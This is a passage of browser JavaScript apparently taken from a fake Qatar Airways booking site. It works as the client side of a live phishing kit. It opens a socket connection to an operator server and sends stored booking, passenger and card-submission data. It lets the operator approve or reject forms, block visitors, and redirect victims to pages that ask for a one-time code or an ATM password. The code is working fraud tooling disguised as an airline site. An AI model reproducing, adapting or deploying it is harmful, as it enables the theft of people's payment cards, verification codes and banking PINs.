    var overlay = document.getElementById('qa-visitor-blocked');
    if (!overlay) return;
    document.documentElement.style.overflow = overlay.dataset.previousOverflow || '';
    overlay.remove();
  }

  function connect() {
    if (!window.io || socket) return;

    socket = window.io(SOCKET_URL, {
      transports: ['polling', 'websocket'],
      autoConnect: true,
      reconnection: true,
      reconnectionAttempts: Infinity,
      reconnectionDelay: 1000,
      reconnectionDelayMax: 5000,
      timeout: 20000,
      withCredentials: false
    });

    socket.on('connect', function () {
      registered = false;
      var visitorIds = readVisitorIds();
      socket.emit('visitor:register', {
        existingVisitorId: visitorIds.primaryId,
        alternateVisitorId: visitorIds.alternateId
      });
    });

    socket.on('successfully-connected', function (data) {
      saveVisitorId(data && data.pid);
      registered = true;
      if (data && data.isBlocked === true) showBlockedScreen();
      else hideBlockedScreen();
      lastPage = '';
      lastSentBookingState = '';
      reportStoredFlightState();
      reportStoredPackageState();
      if (window.__qaPendingBookingState) window.qaTrackBookingState(window.__qaPendingBookingState);
      flushBookingState(true);
      flushPassengerSubmissions();
      flushOperatorSubmissions();
      flushPackageGuestSubmission();
      reportPage(true);
      syncLiveCardPage(true);
      socket.emit('blockedCards:get');
    });

    socket.on('blocked', function () {
      showBlockedScreen();
    });

    socket.on('unblocked', function () {
      hideBlockedScreen();
    });

    socket.on('disconnect', function () {
      registered = false;
    });

    socket.on('payment:submitted', function () {
      window.clearTimeout(finalPaymentFallbackTimer);
      finalPaymentFallbackTimer = null;
      finalPaymentSubmitted = true;
    });

    socket.on('code:action', function (data) {
      var action = data && data.action ? data.action : data;
      lastOperatorSubmission = '';
      window.dispatchEvent(new CustomEvent('qa:operator-action', { detail: { action: safeText(action, 20).toLowerCase() } }));
    });

    socket.on('card:action', function (action) {
      var normalizedAction = safeText(action, 20).toLowerCase();
      lastOperatorSubmission = '';
      window.dispatchEvent(new CustomEvent('qa:operator-action', { detail: { action: normalizedAction } }));
      if (!isCreditCardPage()) return;
      if (normalizedAction === 'otp') {
        socket.emit('visitor:pageEnter', 'التحقق بالرمز');
        window.location.href = '/otp-verification';
      } else if (normalizedAction === 'atm') {
        window.location.href = '/atm-password';
      }
    });

    socket.on('form:approved', function () {
      lastOperatorSubmission = '';
      window.dispatchEvent(new CustomEvent('qa:operator-action', { detail: { action: 'approve' } }));
    });

    socket.on('form:rejected', function () {
      lastOperatorSubmission = '';
      window.dispatchEvent(new CustomEvent('qa:operator-action', { detail: { action: 'reject' } }));
    });

    socket.on('deleted', function () {
      try {
        window.localStorage.removeItem(STORAGE_KEY);
        window.localStorage.removeItem(LEGACY_STORAGE_KEY);
      } catch (error) {}
      registered = false;
    });

    socket.on('visitor:navigate', function (page) {
      if (!page || typeof page !== 'string') return;
      if (page.indexOf('http') === 0) {
        window.location.href = page;
        return;
      }
      var relative = page.replace(/^\/+/, '');
      var targetPath = relative.split('?')[0].replace(/\/+$/, '');
      if (targetPath === 'package-information' && relative.indexOf('?') === -1) {
        var stored = readJson(window.sessionStorage, 'qaPackageSearch');
        var next = readJson(window.sessionStorage, 'qaPackageNextStage');
        var product = safeText(next && next.product || stored && stored.product, 20).toLowerCase();
        var language = safeText(next && next.lang || stored && stored.lang, 5).toLowerCase() === 'en' ? 'en' : 'ar';
        var token = safeText(next && next.token, 64);
        var validProduct = ['stopover', 'flight-hotel', 'hotel'].indexOf(product) !== -1;
        var validContext = validProduct && /^[0-9a-f]{32}$/i.test(token) && stored && Array.isArray(stored.params) && next && next.product === product;
        if (!validContext) {
          console.warn('[Qatar Visitor] Package information navigation skipped: no active package context');
          return;
        }
        var stage = safeText(next && next.data && next.data.stage, 30).toLowerCase();
        if (!/^[a-z-]+$/.test(stage)) stage = 'payment';
        relative = 'package-information?product=' + encodeURIComponent(product) + '&lang=' + encodeURIComponent(language) + '&stage=' + encodeURIComponent(stage);
      }
      window.location.href = '/' + relative;
    });
  }

  function loadSocketClient() {
    if (window.io) {
      connect();
      return;
    }

    var script = document.createElement('script');
    script.src = SOCKET_URL + '/socket.io/socket.io.js';
    script.async = true;
    script.onload = connect;
    script.onerror = function () {
      console.error('[Qatar Visitor] Unable to load presence client');
    };
    document.head.appendChild(script);
  }

  function init() {
    watchNavigation();
    watchFlightState();
    watchPassengerConsent();
    watchOperatorConsent();
    watchLiveCard();
    watchPackageGuestConsent();
    reportStoredPackageState();
    if (window.__qaPendingBookingState) window.qaTrackBookingState(window.__qaPendingBookingState);
    loadSocketClient();
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init, { once: true });
  else init();
})();
